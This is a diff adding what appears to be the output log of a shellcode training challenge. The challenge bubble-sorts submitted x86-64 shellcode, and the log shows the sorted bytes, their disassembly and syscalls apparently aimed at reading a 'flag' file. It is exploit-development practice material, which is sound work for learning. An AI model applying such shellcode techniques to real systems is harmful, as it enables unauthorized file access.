@@ -1,0 +1,62 @@
+
+Reading 0x1000 bytes from stdin into 0x1337000.
+
+Executing filter...
+This challenge is just sorted your your shellcode using bubblesort.
+This sort processed your shellcode 8 bytes at a time. Keep in mind
+The impact of memory endianness on this sort (i.e., the LSB being the
+right-most byte.
+
+This challenge is about to execute the following shellcode:
+
+      Address      |                      Bytes                    |          Instructions
+------------------------------------------------------------------------------------------
+0x0000000001337000 | 48 31 f6                                      | xor rsi, rsi
+0x0000000001337003 | 48 31 d2                                      | xor rdx, rdx
+0x0000000001337006 | 0f 05                                         | syscall 
+0x0000000001337008 | 48 ff c7                                      | inc rdi
+0x000000000133700b | b0 28                                         | mov al, 0x28
+0x000000000133700d | 0f 05                                         | syscall 
+0x000000000133700f | 90                                            | nop 
+0x0000000001337010 | 49 c7 c2 15 cd 5b 07                          | mov r10, 0x75bcd15
+0x0000000001337017 | 90                                            | nop 
+0x0000000001337018 | 48 81 c2 aa aa aa 2f                          | add rdx, 0x2faaaaaa
+0x000000000133701f | 90                                            | nop 
+0x0000000001337020 | 48 c7 c2 66 6c 61 67                          | mov rdx, 0x67616c66
+0x0000000001337027 | 90                                            | nop 
+0x0000000001337028 | 48 c1 e2 20                                   | shl rdx, 0x20
+0x000000000133702c | 90                                            | nop 
+0x000000000133702d | 90                                            | nop 
+0x000000000133702e | 90                                            | nop 
+0x000000000133702f | 90                                            | nop 
+0x0000000001337030 | 50                                            | push rax
+0x0000000001337031 | 90                                            | nop 
+0x0000000001337032 | 90                                            | nop 
+0x0000000001337033 | 90                                            | nop 
+0x0000000001337034 | 90                                            | nop 
+0x0000000001337035 | 90                                            | nop 
+0x0000000001337036 | 90                                            | nop 
+0x0000000001337037 | 90                                            | nop 
+0x0000000001337038 | 48 ff c0                                      | inc rax
+0x000000000133703b | 90                                            | nop 
+0x000000000133703c | 90                                            | nop 
+0x000000000133703d | 90                                            | nop 
+0x000000000133703e | 90                                            | nop 
+0x000000000133703f | 90                                            | nop 
+0x0000000001337040 | 48 31 c0                                      | xor rax, rax
+0x0000000001337043 | 48 ff c0                                      | inc rax
+0x0000000001337046 | 90                                            | nop 
+0x0000000001337047 | 90                                            | nop 
+0x0000000001337048 | 48 31 d2                                      | xor rdx, rdx
+0x000000000133704b | 5e                                            | pop rsi
+0x000000000133704c | 48 31 ff                                      | xor rdi, rdi
+0x000000000133704f | 90                                            | nop 
+0x0000000001337050 | 48 c1 ea 18                                   | shr rdx, 0x18
+0x0000000001337054 | 52                                            | push rdx
+0x0000000001337055 | 48 89 e7                                      | mov rdi, rsp
+0x0000000001337058 | b0 3c                                         | mov al, 0x3c
+0x000000000133705a | 48 31 ff                                      | xor rdi, rdi
+0x000000000133705d | 0f 05                                         | syscall 
+0x000000000133705f | 90                                            | nop 
+
+Executing shellcode!
